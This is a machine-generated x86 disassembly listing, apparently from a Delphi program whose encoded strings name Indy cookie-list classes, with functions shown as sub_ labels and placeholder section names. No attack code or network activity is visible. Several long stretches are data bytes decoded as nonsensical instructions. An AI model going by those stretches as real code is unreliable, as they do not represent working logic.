dec ecx
inc ecx
jne r-xdata
jne r-xdata
inc ecx
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x408d0000
add [ eax + 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_481e1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_481e4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax rw-data
call sub_404e44
sub_4820d0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x114 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4821e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
lea edx [ ebp - 0x110 ]
call sub_403e44
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x114 ]
mov eax [ r-xdata ]
pop ecx
call sub_4624e8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ eax + 0x4 ] ebx
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4821eb
lea eax [ ebp - 0x114 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_4821f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_482254
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx [ eax + 0x4 ]
xor ebx ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48225b
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_482264
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4822b0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0xc ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x8 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4822f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov [ ebx + 0xc ] eax
sub_482318
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4823c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_404e44
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4823ca
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
inc esi
dec [ ebp - 0xc ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov edi [ rw-data ]
mov edi [ edi ]
mov eax [ ebp - 0x4 ]
call edi
dec eax
jne r-xdata
jmp r-xdata
sub_48246f
dec [ eax ]
add [ eax ] al
add [ ebp + 0x73 ] dl
jb r-xdata
sub edi esi
dec [ ecx - 0x3fcc03bb ]
push ebp
push sub_48255a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_48240c
push [ ebp - 0x10 ]
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4823e0
push [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4810f4
mov ecx [ ebp - 0x8 ]
mov eax esi
mov edx r-xdata
call sub_405170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482561
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
popad
insd
add [ gs : eax ] al
add [ eax ] al
xor eax eax
retn
sub_482484
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_482264
xor eax eax
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4824c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48257c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_465030
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48255a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_48240c
push [ ebp - 0x10 ]
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4823e0
push [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4810f4
mov ecx [ ebp - 0x8 ]
mov eax esi
mov edx r-xdata
call sub_405170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482561
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_4825a7
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_4826d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_482318
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jg r-xdata
mov ebx [ esi + 0x8 ]
mov eax [ ebx + 0x38 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x14 ]
mov ecx r-xdata
mov eax [ r-xdata ]
call sub_4625e8
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ esi + 0x8 ]
call sub_480c80
mov eax [ ebp - 0x18 ]
call sub_405120
sub eax 0x2
jno r-xdata
push eax
lea ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax [ esi + 0x8 ]
call sub_480c80
mov eax [ ebp - 0x1c ]
mov edx 0x2
pop ecx
call sub_405384
mov eax [ esi + 0x4 ]
sub eax 0x1
jb r-xdata
call sub_403e34
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_48240c
mov eax [ ebp - 0x20 ]
call sub_405120
test eax eax
jle r-xdata
je r-xdata
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
mov [ ebp - 0x5 ] 0x2
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4826da
sub_48271b
inc [ 0x72000000 ]
popad
insb
insd
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
mov ebx eax
mov eax ebx
call sub_4823dc
xor eax eax
mov [ ebx + 0x4 ] eax
pop ebx
retn
sub_482748
push ebp
mov ebp esp
push ebx
mov ebx rw-data
xor eax eax
push ebp
push sub_4827aa
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4827b1
retn
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403f64
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax [ r-xdata ]
call sub_462560
sub_482888
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
xor edx edx
push ebp
push sub_4828e2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x30 ]
call sub_482878
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4804d0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call sub_47ffe8
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4828e9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4828f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_417128
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ff04
mov [ esi + 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_482948
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0xc ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x10 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417160
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_48298c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx ] 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp + 0x48 ] ch
add [ eax ] bh
add [ eax ] al
add [ edi + eax * 2 + 0x41 ] bl
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ah
mov eax [ ecx ]
lodsb [ esi ]
outsb
inc ecx
add [ edx + edi * 2 + 0x797c0041 ] ah
inc ecx
add [ esi + ecx * 4 - 0x712fffbf ] bl
inc ecx
add ah dl
mov es [ ecx ]
fmul [ esi + 0x7e680041 ]
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add [ eax + edx * 4 - 0x6e7fffbf ] ch
inc ecx
add ah dh
test [ ecx ] eax
mov esp 0x3c004191
xchg edx eax
inc ecx
add [ eax - 0x74 ] al
inc ecx
add [ eax - 0x74 ] dl
inc ecx
add ah al
js r-xdata
ror [ ecx + eax * 2 + 0x418fd400 ] 0x1
add ah ch
mov [ ecx ] es
sub al 0x8d
inc ecx
add [ eax + 0x1400418d ] bl
jle r-xdata
add al 0x92
inc ecx
add [ 0x43644954 ] cl
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4c
imul esi [ ebx + 0x74 ] 0x2a80c08b
dec eax
add [ edi ] al
or eax 0x43644954
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4c
imul esi [ ebx + 0x74 ] r-xdata
dec esp
dec eax
inc ecx
add [ eax ] al
add [ eax ] cl
dec ecx
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x0
add al dh
sub cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx ] ch
dec eax
add [ eax + 0x2b ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2b ] ah
dec eax
add [ eax + eax ] ch
add [ eax ] al
movsb [ edi ] [ esi ]
inc ebx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
das
dec eax
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add [ eax - 0x33ffb7d0 ] ch
jno r-xdata
add [ eax ] bl
mov es [ ecx ]
hlt
add [ edi + ecx * 4 ] dh
inc ecx
add ah al
add [ ecx ] 0x98
add [ ecx ] sub_418f70
or [ edi - 0x7e03ffbf ] 0x41
add [ eax - 0x7e ] dl
inc ecx
add ah bh
add [ ecx ] 0x90
test [ ecx ] al
call 0xffffffffa4486bd5
test [ ecx ] eax
mov ah 0x8c
inc ecx
add al dl
mov [ ecx ] es
aam 0x8f
inc ecx
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] al
mov al 0x10
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
inc ecx
inc eax
add ah bh
inc eax
arpl [ ecx + 0x70 ] sp
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x78
sub ecx [ eax ]
pop es
adc [ ecx + ecx * 2 + 0x64 ] edx
dec esi
je r-xdata
inc eax
add [ eax ] bl
add [ eax ] al
add [ eax + 0x1c004010 ] dh
add [ eax ] al
add [ eax + 0x24004010 ] dh
add [ eax ] al
add [ ecx ] dl
push esp
dec ecx
dec esi
je r-xdata
add [ eax + 0x6000482f ] cl
xor cl [ eax ]
aam 0x31
dec eax
add [ eax ] ah
xor cl [ eax ]
xor al 0x32
dec eax
add [ eax + 0x33 ] dh
dec eax
add [ eax ] bl
xor [ eax ] ecx
push cs
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0xc004010 ] dh
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + 0x18004010 ] dh
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
jno r-xdata
test al 0x30
dec eax
add ah cl
add [ eax ] bl
aas
inc eax
add ah al
das
dec eax
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add [ eax - 0x33ffb7d0 ] ch
arpl [ ecx + 0x70 ] sp
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0xfffffff0
sub cl [ eax ]
xor [ ecx + eax * 2 ] al
add [ eax ] al
or [ ecx + 0x64 ] cl
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x0
add ah ch
sub ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x2c
dec eax
add [ esp + ebp + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
sub al 0x48
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
sub cl [ eax ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0xffffff8d
inc eax
add ah ch
sub al 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x2d540048 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
sub eax r--data
add [ eax ] al
mov al [ 0xffffffffac00482b ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
das
dec eax
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add [ eax - 0x33ffb7d0 ] ch
jno r-xdata
dec eax
add [ eax ] al
add [ eax ] cl
dec ecx
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x0
add [ eax + r-xdata ] dl
adc [ edx ] eax
xor eax 0x4
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] cl
dec ecx
inc ebx
inc esi
inc ebx
xor dh [ ecx ]
xor [ ecx ] bh
nop
push esp
sub al 0x48
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x52
inc esi
inc ebx
xor dh [ ecx ]
xor [ ecx ] bh
in al dx
sub ecx [ eax ]
je r-xdata
push edx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x52
add [ eax - 0x63ffb7c9 ] al
cmp [ eax ] cl
enter 0x4837 0x0
and [ edx ] dh
dec eax
add [ eax - 0x5fffb7c8 ] cl
cmp [ eax ] ecx
sbb [ ecx ] dh
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x38004010 ] dh
add [ eax ] al
add [ eax + 0x3c004010 ] dh
add [ eax ] al
add [ eax ] dl
push esp
dec ecx
inc ebx
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x52
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
add [ eax ] al
or [ ecx + 0x64 ] cl
inc ebx
add al bl
ja r-xdata
inc esi
inc ebx
xor bh [ ecx ]
xor eax 0x482d5490
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x52
inc esi
inc ebx
xor bh [ ecx ]
xor eax r-xdata
push eax
sub al 0x48
add [ eax ] al
add [ eax ] cl
dec ecx
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x0
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sub eax 0x240048
add [ eax ] al
xor [ ebp + 0x41 ] al
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x48 ] cl
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add ah al
jae r-xdata
push edx
add [ ebx + edi ] dl
dec eax
add [ eax + 0x3b ] dl
dec eax
add al cl
aaa
dec eax
add [ eax ] ah
xor cl [ eax ]
mov [ eax ] bh
dec eax
add [ ebx + edi + 0x48 ] ah
add [ eax ] bl
xor [ eax ] ecx
push cs
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x40004010 ] dh
add [ eax ] al
add [ esp + ebp + 0x48 ] bh
add [ eax ] cl
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482ec6
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov eax [ ebp - 0xc ]
call sub_405120
test eax eax
jle r-xdata
outsd
outsd
inc ebx
add ah bl
ja r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4051e4
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40512c
imul ebp [ ecx + 0x65 ] 0x0
add al ah
ja r-xdata
add [ ebp - 0x74aaffc0 ] cl
in al dx
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
add al dl
ja sub_482e24
add ah dl
ja r-xdata
add [ esp + esi * 2 + 0x41 ] bl
add al bl
je r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
mov eax [ ebp - 0xc ]
call sub_405314
xor eax eax
push ebp
push sub_482ebf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405120
test eax eax
jle r-xdata
add [ edx ] cl
push esp
dec ecx
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x73
nop
add [ esi ] ch
dec eax
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x73
enter 0x482d 0x0
rol [ ebp + 0x41 ] 0x0
sub_482e24
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
mov eax [ ebp - 0xc ]
call sub_405314
xor eax eax
push ebp
push sub_482ebf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482ec6
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov eax [ ebp - 0xc ]
call sub_405120
test eax eax
jle r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov edx 0x4
call sub_4051e4
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40512c
sub_482ee4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp - 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_482f5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40512c
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482f61
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40512c
sub_482f88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_417128
mov [ esi + 0x28 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_482fc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
call sub_404330
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
xor edx edx
push ebp
push sub_48308a
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
call sub_4840cc
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4042d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_417160
retn
xor eax eax
push ebp
push sub_483066
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
cmp esi 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl 0x1
call sub_4840f0
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
cmp esi 0xffffffff
jle r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4830a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_48310a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483111
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov edi ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4834ec
movzx eax [ edi + 0x28 ]
mov [ esi + 0x28 ] al
sub_483118
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4831c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_472e08
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_472eb4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebx + 0x10 ]
call sub_405270
sete al
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_472f0c
mov ecx [ ebp - 0xc ]
mov edx [ ebx + 0x10 ]
mov eax [ r-xdata ]
call sub_462854
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_405120
mov edx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_470830
